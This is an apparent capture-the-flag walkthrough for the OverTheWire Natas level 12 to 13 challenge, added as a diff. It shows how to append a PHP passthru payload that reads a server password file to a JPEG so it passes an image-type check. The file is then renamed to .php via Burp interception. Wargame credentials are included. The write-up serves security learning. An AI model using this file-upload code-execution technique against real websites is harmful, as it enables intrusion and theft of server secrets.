@@ -1,0 +1,43 @@
+Title:Natas Level 12 → Level 13 (Advanced Malicious File injections)
+
+#Credentials
+Username: natas13
+Password: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
+URL:      http://natas13.natas.labs.overthewire.org
+
+
+#Concept
+In this level it is similar to the previous level which involved injecting the malicious file by uploading it, in the previous level the file scanner scanned the headers of the file and not the contents but in this level the scanner is scans for the content of the file and not the headers,basically it involves appending the malicious file at the end of the image file.
+
+#Solution:
+
+1.Login to the level using the credentials mentioned above.
+
+2.After logging in, the website will display the  file input mechanism(In which you can upload the file and the file will be displayed) {You can try to explore and get the answer to yourself if you feel you want a challenge}
+
+#Note: If you really feeling challenging then try to understand the mechanism of the file uploading, if you are feeling lost then you can come back here no worries you have tried your best
+
+3.Download an image from the net which should be around 1KB or you can download the image file and then compress it from the online website.
+
+4.Open up 'vim' to edit the contents of the file (yeah contents which will be in binary format)
+
+5.Erase some of the  last part of the binary  (Because if you append the code without erasing some part of the file, the file mechanism will tell that "it is more than 1kb")
+
+6.Append the "php" code at the end 
+
+<?php
+echo passthru('cat /etc/natas_webpass/natas14');
+?>
+
+7.Save the file and then upload it to the website
+
+8.Open Burpsuite and intercept the file using the proxy and change the headers file format from jpg to php and change the "Content-Type" from image/jpg to "application/php" and forward the request.
+
+#You will see that it will accept the file and will display as the php link click on the link it will display as
+
+JFIF��C(#(#!#-+(0{some Binary format data} z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ(The password for natas14)  {This will be present at the last since we appended the code at the last}
+
+#Note:Now Why this file works because the in the beginning of the file there is "JFIF" and some of the binary data which is basically the file format of the JPEG and this thing "exif_imagetype(){Present in the code I got this by giving an error}" basically it read the contents of the file and checks that "JFIF" which is the JPEG file and hence accepts the file and displaysit
+
+9.Done
+
